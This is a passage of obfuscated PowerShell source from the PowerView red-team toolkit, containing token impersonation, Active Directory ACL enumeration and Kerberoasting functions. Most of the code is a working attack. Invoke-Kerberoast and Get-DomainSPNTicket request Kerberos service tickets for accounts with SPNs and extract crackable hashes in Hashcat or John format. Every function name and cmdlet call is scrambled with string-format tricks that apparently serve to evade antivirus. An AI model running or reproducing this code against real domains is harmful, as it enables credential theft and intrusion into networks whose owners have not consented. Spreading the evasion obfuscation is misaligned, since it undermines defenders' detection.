Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = ${Tr`UE}, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`dEn`Tial},

        [Parameter(Mandatory = ${T`RuE}, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${T`O`keNHANDlE},

        [Switch]
        ${QU`iET}
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not ${psboUnD`PAra`mE`T`ers}['Quiet'])) {
        &("{4}{1}{3}{2}{0}" -f 'arning','te','W','-','Wri') "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if (${p`SbOu`NdpaRamE`TERS}['TokenHandle']) {
        ${LogOnT`oKENh`AN`Dle} = ${TOKEn`h`ANd`Le}
    }
    else {
        ${logonTOke`N`Hand`le} = [IntPtr]::Zero
        ${NE`T`WoRkcrE`DeNtiAL} = ${cre`dEnTi`Al}.GetNetworkCredential()
        ${UseRdo`m`AIN} = ${NE`TWOR`KCREd`e`N`TIal}.Domain
        ${US`ERNa`me} = ${Ne`TWorKcrE`dE`NT`IAL}.UserName
        &("{1}{0}{3}{2}" -f 'e-Warn','Writ','ng','i') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        ${RE`sULT} = ${A`D`VaP`i32}::LogonUser(${us`e`RnaMe}, ${U`SE`RdO`maiN}, ${netWo`RKC`R`e`D`ENTiAl}.Password, 9, 3, [ref]${LOgO`NTOk`en`ha`N`dLE});${La`S`Ter`Ror} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not ${Re`sUlt}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # actually impersonate the token from LogonUser()
    ${R`Es`ULt} = ${AD`Vap`i32}::ImpersonateLoggedOnUser(${LOGo`N`TOKeNhAn`D`Le})

    if (-not ${R`eSULT}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    &("{1}{2}{3}{0}"-f 'e','W','rite-Verbo','s') "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    ${logoN`TokenhA`N`DLe}
}


function iNvO`ke-REvert`Tos`e`lf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${T`OK`EnHAndlE}
    )

    if (${psB`ouN`d`paRaMe`T`ErS}['TokenHandle']) {
        &("{3}{1}{2}{0}" -f 'ning','rite-','War','W') "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        ${r`e`sUlt} = ${keR`Ne`l32}::CloseHandle(${Toke`NhAN`dle})
    }

    ${r`ES`Ult} = ${A`DVAPi32}::RevertToSelf();${La`sT`er`ROr} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not ${R`e`SUlT}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    &("{2}{0}{1}{3}" -f'it','e-Verbo','Wr','se') "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function GET-DOMa`I`NS`pN`TICK`ET {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: machosec, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of Hashcat).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.EXAMPLE

Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR

Request kerberos service tickets for all users with non-null SPNs and output in JTR format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = ${t`RUe}, ValueFromPipeline = ${T`RUe})]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${s`pn},

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = ${t`Rue}, ValueFromPipeline = ${TR`UE})]
        [ValidateScript({ ${_}.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        ${uS`eR},

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        ${ouTp`U`TF`ORm`At} = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`e`NTial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${Nu`Ll} = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if (${P`sB`o`UNDPAR`AMeT`ErS}['Credential']) {
            ${lo`goNT`OK`eN} = &("{0}{6}{3}{4}{2}{5}{1}" -f 'I','n','nat','voke-UserImp','erso','io','n') -Credential ${CREd`En`Ti`Al}
        }
    }

    PROCESS {
        if (${psbOuN`D`PAraM`E`T`ErS}['User']) {
            ${T`ARGETobj`ECT} = ${u`sEr}
        }
        else {
            ${t`ArgEtOb`j`ECt} = ${s`Pn}
        }

        ForEach (${Obje`cT} in ${tAr`Geto`BJ`eCT}) {
            if (${pSbOUNdP`A`R`Am`eTerS}['User']) {
                ${uSErS`pn} = ${O`BJ`ect}.ServicePrincipalName
                ${SaMacCOu`NtnA`Me} = ${oB`jE`cT}.SamAccountName
                ${dIStI`N`Guished`N`AMe} = ${OBJE`CT}.DistinguishedName
            }
            else {
                ${uSE`Rs`PN} = ${OBJ`EcT}
                ${sam`A`cc`oU`NtNAMe} = 'UNKNOWN'
                ${D`ISTi`Ngu`IsH`edN`AmE} = 'UNKNOWN'
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if (${User`s`pN} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${U`S`eRSpN} = ${use`R`spn}[0]
            }

            try {
                ${T`i`ckeT} = &("{2}{1}{0}" -f 'bject','w-O','Ne') ("{13}{9}{12}{7}{6}{10}{5}{1}{3}{4}{0}{2}{11}{14}{8}" -f 'q','K','uestorSec','erber','osRe','.','nt','e','en','I','ityModel.Tokens','uri','d','System.','tyTok') -ArgumentList ${USer`s`pn}
            }
            catch {
                &("{0}{2}{3}{1}" -f 'W','ing','rit','e-Warn') "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if (${Ti`CkeT}) {
                ${t`ICKE`TBYt`esTr`eAm} = ${ti`cKET}.GetRequest()
            }
            if (${Tic`ket`B`Yt`Estream}) {
                ${O`UT} = &("{3}{1}{0}{2}"-f'-Objec','ew','t','N') ("{0}{1}{2}" -f 'P','SObj','ect')

                ${tickET`hEXsTrE`AM} = [System.BitConverter]::ToString(${TI`CkE`TBy`TeStreaM}) -replace '-'

                ${o`UT} | &("{2}{0}{1}"-f 'mb','er','Add-Me') ("{0}{2}{1}" -f 'Not','operty','epr') 'SamAccountName' ${S`A`mACc`oUNt`NaME}
                ${O`UT} | &("{2}{1}{0}{3}" -f'Mem','dd-','A','ber') ("{2}{0}{1}{3}" -f'eprope','r','Not','ty') 'DistinguishedName' ${DISTIN`guIsH`e`DnA`mE}
                ${O`UT} | &("{3}{0}{1}{2}" -f 'e','mbe','r','Add-M') ("{3}{0}{2}{1}"-f 'ro','erty','p','Notep') 'ServicePrincipalName' ${TICk`ET}.ServicePrincipalName

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if(${T`i`CK`ETHeXSt`ReaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${e`TY`Pe} = [Convert]::ToByte( ${ma`T`cheS}.EtypeLen, 16 )
                    ${ci`pHe`RTEXT`LeN} = [Convert]::ToUInt32(${m`ATch`es}.CipherTextLen, 16)-4
                    ${c`ipHEr`TeXt} = ${m`A`TChes}.DataToEnd.Substring(0,${CI`ph`ERtEX`Tlen}*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if(${MaT`c`Hes}.DataToEnd.Substring(${ciPh`ERt`eXTl`eN}*2, 4) -ne 'A482') {
                        &("{2}{0}{1}" -f 'W','arning','Write-') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${Ha`sh} = ${NU`ll}
                        ${O`Ut} | &("{1}{3}{0}{2}"-f'Membe','Add','r','-') ("{2}{0}{1}"-f 'te','property','No') 'TicketByteHexStream' ([Bitconverter]::ToString(${ticKEt`BY`TEStr`e`Am}).Replace('-',''))
                    } else {
                        ${Ha`sh} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | &("{2}{1}{0}" -f'er','mb','Add-Me') ("{0}{1}{2}" -f'Note','pr','operty') 'TicketByteHexStream' ${nU`lL}
                    }
                } else {
                    &("{2}{0}{1}" -f 'Warn','ing','Write-') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${hA`sH} = ${N`Ull}
                    ${o`UT} | &("{2}{0}{1}" -f'd-Mem','ber','Ad') ("{2}{0}{1}" -f 'ro','perty','Notep') 'TicketByteHexStream' ([Bitconverter]::ToString(${t`i`c`KetbytEsTr`eAm}).Replace('-',''))
                }

                if(${HA`sh}) {
                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
                    if (${O`UtpUtfOr`mAt} -match 'John') {
                        ${hASH`FOR`m`AT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${diST`I`NgUisHEDn`Ame} -ne 'UNKNOWN') {
                            ${U`SER`D`OMaIn} = ${DiS`TiNguISh`Ed`NAME}.SubString(${DiStinGui`ShE`dna`ME}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${USEr`d`O`mAin} = 'UNKNOWN'
                        }

                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
                        ${hasHF`O`RmaT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{2}{0}{1}" -f '-Me','mber','Add') ("{2}{0}{1}{3}" -f'teprope','r','No','ty') 'Hash' ${H`AshfoRm`At}
                }

                ${o`UT}.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                ${o`UT}
            }
        }
    }

    END {
        if (${l`O`GON`TOKen}) {
            &("{4}{0}{2}{3}{1}" -f'oke-Reve','lf','r','tToSe','Inv') -TokenHandle ${lOgo`NTo`kEn}
        }
    }
}


function in`VokE-`k`eRBEro`Ast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  

.DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'Hashcat'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Invoke-Kerberoast | fl

Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
format instead of Hashcat.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl

Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`UE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${IdeNT`I`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ld`APF`IL`TER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`eaRcHb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${seAr`c`hscOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSULT`PAG`e`SizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VeRtIMEL`I`m`It},

        [Switch]
        ${To`MB`stOnE},

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        ${OUt`Pu`TFoRmat} = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDe`NtI`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${US`ErSEAr`C`HERargUm`EnTS} = @{
            'SPN' = ${TR`UE}
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if (${p`sboundP`A`RaME`TERs}['Domain']) { ${usErS`eA`RCHerARgUM`ENTs}['Domain'] = ${d`om`AIN} }
        if (${PSBO`U`N`D`ParameteRs}['LDAPFilter']) { ${USeR`SEarChER`Ar`gu`M`E`Nts}['LDAPFilter'] = ${lDAPF`I`L`TEr} }
        if (${P`SbOun`dParAm`et`ERS}['SearchBase']) { ${UseRsEaRc`hERA`R`g`UM`enTS}['SearchBase'] = ${sEa`R`ChB`ASE} }
        if (${PsbOunDp`Ar`Ame`TerS}['Server']) { ${uSeRs`eARCHERaRgU`m`EN`TS}['Server'] = ${Se`RveR} }
        if (${P`s`Boun`Dp`ArameTe`RS}['SearchScope']) { ${US`ERs`EAR`CH`ERarguME`N`Ts}['SearchScope'] = ${sE`ARcH`ScOpe} }
        if (${psBO`UndPaRA`m`eTers}['ResultPageSize']) { ${usErs`EaRCheR`A`Rg`UMeNts}['ResultPageSize'] = ${r`esultpAgE`SIzE} }
        if (${PsbOUN`dP`Aram`EtE`Rs}['ServerTimeLimit']) { ${USErsEAR`cH`ErA`R`GUme`NTs}['ServerTimeLimit'] = ${sErve`RT`imEL`iMit} }
        if (${PSBOun`dpArA`Me`Te`RS}['Tombstone']) { ${UseRs`earcHeR`ArGU`M`eNTs}['Tombstone'] = ${Tombs`T`ONe} }
        if (${psBOUndpar`AmE`T`eRS}['Credential']) { ${user`seARcHEra`RgUm`e`N`TS}['Credential'] = ${cre`DEN`TIAl} }

        if (${P`sB`OUND`paRam`eTers}['Credential']) {
            ${lOgO`Nt`OKEn} = &("{6}{0}{5}{2}{3}{4}{1}"-f'vo','nation','serIm','per','so','ke-U','In') -Credential ${c`R`EDENT`ial}
        }
    }

    PROCESS {
        if (${p`SbOUN`Dp`ArAmeTErs}['Identity']) { ${uSe`Rs`EarcH`E`RarG`UmenTs}['Identity'] = ${i`d`eNtiTy} }
        &("{3}{0}{1}{2}"-f 'Do','ma','inUser','Get-') @UserSearcherArguments | &("{1}{0}{3}{2}"-f 'r','Whe','Object','e-') {${_}.samaccountname -ne 'krbtgt'} | &("{3}{1}{5}{0}{2}{4}" -f'SPNT','omai','ick','Get-D','et','n') -OutputFormat ${OuT`p`U`TfOrMAT}
    }

    END {
        if (${LOGo`Nto`Ken}) {
            &("{1}{0}{4}{3}{2}" -f'nvok','I','f','oSel','e-RevertT') -TokenHandle ${log`ONTO`K`en}
        }
    }
}


function GE`T-PA`THACL {
<#
.SYNOPSIS

Enumerates the ACL for a given file path.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  

.DESCRIPTION

Enumerates the ACL for a specified file/folder path, and translates
the access rules for each entry into readable formats. If -Credential is passed,
Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.

.PARAMETER Path

Specifies the local or remote path to enumerate the ACLs for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target path.

.EXAMPLE

Get-PathAcl "\\SERVER\Share\"

Returns ACLs for the given UNC share.

.EXAMPLE

gci .\test.txt | Get-PathAcl

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
Get-PathAcl -Path "\\SERVER\Share\" -Credential $Cred

.INPUTS

String

One of more paths to enumerate ACLs for.

.OUTPUTS

PowerView.FileACL

A custom object with the full path and associated ACL entries.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${t`RuE}, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('FullName')]
        [String[]]
        ${P`ATh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DENT`I`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function conveRt-f`i`Le`RI`ghT {
            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            [CmdletBinding()]
            Param(
                [Int]
                ${f`sr}
            )

            ${a`c`CeSS`MAsk} = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            ${S`IMPLep`ErMis`S`i`ONS} = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            ${PErM`IS`s`ioNS} = @()

            # get simple permission
            ${pERMiS`s`IO`Ns} += ${S`iMPL`EPeRMiSS`ioNs}.Keys | &("{0}{2}{3}{4}{1}" -f 'F','ct','orEa','ch','-Obje') {
                              if ((${F`Sr} -band ${_}) -eq ${_}) {
                                ${siM`ple`p`ErMI`sSIonS}[${_}]
                                ${f`sr} = ${F`sR} -band (-not ${_})
                              }
                            }

            # get remaining extended permissions
            ${Perm`issI`ONs} += ${a`CceSsM`AsK}.Keys | &("{0}{1}{2}"-f 'Where-','Ob','ject') { ${f`sr} -band ${_} } | &("{0}{2}{1}{4}{3}"-f 'ForE','h-O','ac','ject','b') { ${acCESS`ma`Sk}[${_}] }
            (${p`e`RMISSIoNs} | &("{2}{0}{3}{1}"-f 'e','-Object','Wh','re') {${_}}) -join ','
        }

        ${c`oNVeRTAR`g`UMentS} = @{}
        if (${ps`Boun`dp`Ara`mETeRs}['Credential']) { ${c`ON`VeR`TaRGumENTs}['Credential'] = ${CR`E`DEnti`Al} }

        ${maPP`EDCo`Mpu`TerS} = @{}
    }

    PROCESS {
        ForEach (${Ta`RGeTP`ATH} in ${P`Ath}) {
            try {
                if ((${tAR`ge`TPaTH} -Match '\\\\.*\\.*') -and (${PSbOUNdPA`R`AMEt`Ers}['Credential'])) {
                    ${hO`st`COMput`Er} = (&("{0}{1}{2}" -f'New-Ob','jec','t') ("{1}{2}{0}" -f'ri','System.','U')(${Ta`R`GetpAth})).Host
                    if (-not ${MAPpE`dc`oMPuTe`RS}[${hOsT`com`pu`TEr}]) {
                        # map IPC$ to this computer if it's not already
                        &("{3}{2}{1}{0}{4}{5}" -f'emoteC','-R','d','Ad','onnecti','on') -ComputerName ${Ho`StcOmPU`TER} -Credential ${CR`E`DE`NTiAL}
                        ${mAP`PeD`cOM`Put`erS}[${hOS`TCO`mpUtER}] = ${t`Rue}
                    }
                }

                ${a`CL} = &("{0}{1}" -f 'Get-A','cl') -Path ${tA`RGETP`ATh}

                ${A`cl}.GetAccessRules(${t`RUe}, ${Tr`Ue}, [System.Security.Principal.SecurityIdentifier]) | &("{1}{0}{3}{2}"-f 'h-','ForEac','bject','O') {
                    ${S`Id} = ${_}.IdentityReference.Value
                    ${N`AME} = &("{1}{0}{3}{2}"-f'Fr','Convert','SID','om-') -ObjectSID ${s`ID} @ConvertArguments

                    ${O`UT} = &("{1}{0}{2}" -f'ec','New-Obj','t') ("{1}{0}" -f'SObject','P')
                    ${O`UT} | &("{2}{0}{1}" -f 'emb','er','Add-M') ("{0}{3}{1}{2}" -f'N','eprop','erty','ot') 'Path' ${tAR`G`ETpa`TH}
                    ${O`UT} | &("{1}{2}{0}" -f'er','Add-Me','mb') ("{1}{0}{2}"-f 'otep','N','roperty') 'FileSystemRights' (&("{3}{4}{0}{2}{1}" -f 'F','ght','ileRi','Convert','-') -FSR ${_}.FileSystemRights.value__)
                    ${O`Ut} | &("{2}{0}{1}"-f'-Mem','ber','Add') ("{3}{2}{1}{0}"-f 'roperty','p','ote','N') 'IdentityReference' ${na`ME}
                    ${o`Ut} | &("{0}{2}{1}" -f 'Add-Mem','er','b') ("{3}{0}{1}{2}" -f 'prop','er','ty','Note') 'IdentitySID' ${S`ID}
                    ${o`Ut} | &("{1}{2}{3}{0}" -f'r','Add-M','e','mbe') ("{0}{2}{1}" -f'N','rty','oteprope') 'AccessControlType' ${_}.AccessControlType
                    ${O`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    ${O`UT}
                }
            }
            catch {
                &("{1}{0}{2}"-f 'te-Ve','Wri','rbose') "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        # remove the IPC$ mappings
        ${MaPpeDCo`M`p`U`TErS}.Keys | &("{4}{2}{0}{1}{3}" -f 'mote','Conne','ove-Re','ction','Rem')
    }
}


function CO`NV`ert-`LD`APp`R`OPERTY {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${TR`Ue}, ValueFromPipeline = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        ${P`ROp`ErTIEs}
    )

    ${oBjeCtpR`O`P`ErTieS} = @{}

    ${Pr`OPer`TIeS}.PropertyNames | &("{2}{3}{0}{1}" -f'c','t','ForEac','h-Obje') {
        if (${_} -ne 'adspath') {
            if ((${_} -eq 'objectsid') -or (${_} -eq 'sidhistory')) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                ${Ob`jectpRop`eRT`Ies}[${_}] = ${pROp`eRtI`Es}[${_}] | &("{1}{2}{0}" -f'ect','ForEac','h-Obj') { (&("{3}{1}{2}{0}" -f't','e','c','New-Obj') ("{4}{1}{5}{3}{0}{2}{7}{6}"-f'.','stem','Pri','y','Sy','.Securit','cipal.SecurityIdentifier','n')(${_}, 0)).Value }
            }
            elseif (${_} -eq 'grouptype') {
                ${ObjE`ctp`Ro`peRTi`es}[${_}] = ${PRo`PE`Rti`es}[${_}][0] -as ${gROUp`Typ`eE`NUM}
            }
            elseif (${_} -eq 'samaccounttype') {
                ${o`B`jecTprO`PeRTIes}[${_}] = ${pr`oP`eRT`ieS}[${_}][0] -as ${SamACCOu`N`TT`y`PeeNuM}
            }
            elseif (${_} -eq 'objectguid') {
                # convert the GUID to a string
